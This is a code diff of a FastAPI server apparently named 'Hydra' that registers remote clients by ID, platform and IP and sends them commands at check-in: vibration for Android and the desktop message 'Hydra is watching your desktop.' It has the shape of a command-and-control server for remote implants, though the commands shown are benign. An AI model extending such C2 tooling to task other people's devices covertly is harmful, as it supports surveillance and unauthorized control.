@@ -22,14 +22,12 @@ def print_banner():
 
 @asynccontextmanager
 async def lifespan(app: FastAPI):
-    # Initializes the SQLite database on startup
     print_banner()
     await init_db()
     yield
 
 app = FastAPI(lifespan=lifespan, redirect_slashes=False)
 
-# Standard CORS to prevent header rejections
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -41,7 +39,6 @@ app.add_middleware(
 async def status():
     return {"hydra": "online", "status": "active"}
 
-# This route handles both GET and POST to bypass the 405 error
 @app.api_route("/checkin/{client_id}", methods=["GET", "POST"])
 async def checkin(client_id: str, platform: str, request: Request):
     client_ip = request.client.host
@@ -50,17 +47,23 @@ async def checkin(client_id: str, platform: str, request: Request):
     print(f"[*] {method} request received from {client_id}")
     print(f"[*] Source IP: {client_ip} | Platform: {platform}")
 
-    # Register the client regardless of the method used
     await register_client(client_id, platform, client_ip)
     
+    # --- COMMAND PARSER LOGIC ---
+    # Logic to decide which command to send based on platform
+    command_payload = None
+    if platform.lower() == "android":
+        command_payload = {"action": "vibrate", "duration": 1500}
+    elif platform.lower() == "desktop":
+        command_payload = {"action": "msg", "content": "Hydra is watching your desktop."}
+
     return {
         "status": "success",
-        "method_detected": method,
-        "response": "acknowledged"
+        "response": "acknowledged",
+        "command": command_payload
     }
 
 if __name__ == "__main__":
-    # Ensure your .pem files are in the same directory
     uvicorn.run(
         app, 
         host="0.0.0.0", 
